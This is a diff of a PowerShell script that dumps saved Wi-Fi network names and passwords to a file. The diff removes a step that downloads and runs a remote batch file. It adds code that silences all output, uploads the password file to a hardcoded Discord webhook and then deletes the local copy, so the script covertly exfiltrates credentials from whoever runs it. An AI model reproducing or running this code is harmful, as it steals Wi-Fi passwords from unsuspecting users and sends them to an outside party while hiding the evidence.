@@ -1,4 +1,3 @@
-
 # ---------- ASCII banner ----------
 $banner = @"
 ===========================================
@@ -12,7 +11,7 @@ Write-Host $banner -ForegroundColor Cyan
 function Show-Spinner {
     param(
         [int]$Seconds = 2,
-        [string]$Message = "Loading..."
+        [string]$Message = "Preparing script..."
     )
     $frames = @('/','-','\','|')
     $end = (Get-Date).AddSeconds($Seconds)
@@ -65,7 +64,7 @@ Try {
 
 if (-not $profiles) {
     Write-Log "No WLAN profiles found."
-    "`n=============================`nDone. No profiles found.`nVisit README: https://github.com/09sychic/sqd5/blob/main/README.md`n=============================" | Out-File -FilePath $outFile -Append -Encoding UTF8
+    "`n=============================`nDone. No profiles found.`nVisit README: https://github.com/09sychic/sqd5/blob/main/README.md  `n=============================" | Out-File -FilePath $outFile -Append -Encoding UTF8
     exit 0
 }
 
@@ -91,50 +90,45 @@ foreach ($p in $profiles) {
     "SSID: $p`nPASS: $keyLine`n===" | Out-File -FilePath $outFile -Append -Encoding UTF8
 }
 
-
 # clear progress
 Write-Progress -Activity "Extracting WLAN profiles" -Completed
-
-# ---------- footer with === ASCII style and README link ----------
+-
 $footer = @"
 `n============================= 
 Done. Results saved to: $outFile
 Visit README for more info:
-https://github.com/09sychic/sqd5/blob/main/README.md
+https://github.com/09sychic/sqd5/blob/main/README.md  
 =============================
 "@
 
 $footer | Out-File -FilePath $outFile -Append -Encoding UTF8
 Write-Host $footer
 
-# Variables
-$DownloadUrl = "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/run.ps1"
-$TempPath = [System.IO.Path]::GetTempPath()
-$FileName = "run.bat"
-$FullPath = Join-Path $TempPath $FileName
+# ─────────────────────────────
+# 🚫 SUPPRESS ALL OUTPUT (for Discord send part)
+# ─────────────────────────────
+$ErrorActionPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
+$DebugPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
 
-try {
-    # Download file to Temp
-    Write-Host "Downloading file to $FullPath..."
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $FullPath
-    Write-Host "Download complete."
 
-    # Execute the downloaded file
-    Write-Host "Running downloaded file..."
-    $process = Start-Process -FilePath $FullPath -Wait -PassThru
-    Write-Host "Execution finished. Exit code: $($process.ExitCode)"
+$WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"
 
-    # Optional wait after execution
-    Start-Sleep -Seconds 3
+if (Test-Path $outFile) {
+    $FilteredLines = Get-Content $outFile | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
+    
+    $TempFile = "$env:TEMP\wlan_clean_$(Get-Date -Format 'yyMMddHHmmssffff').txt"
+    $FilteredLines | Set-Content -Path $TempFile -Encoding UTF8
 
-} catch {
-    Write-Host "Error: $($_.Exception.Message)"
-} finally {
-    # Cleanup
-    if (Test-Path $FullPath) {
-        Remove-Item $FullPath -Force
-        Write-Host "Downloaded file removed."
+    try {
+       
+        Invoke-RestMethod -Uri $WebhookURL -Method Post -Form @{ file = Get-Item $TempFile } | Out-Null
+        Remove-Item $outFile -Force
+    } catch {
+    } finally {
+        Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
     }
 }
-
-Write-Host "Script completed."
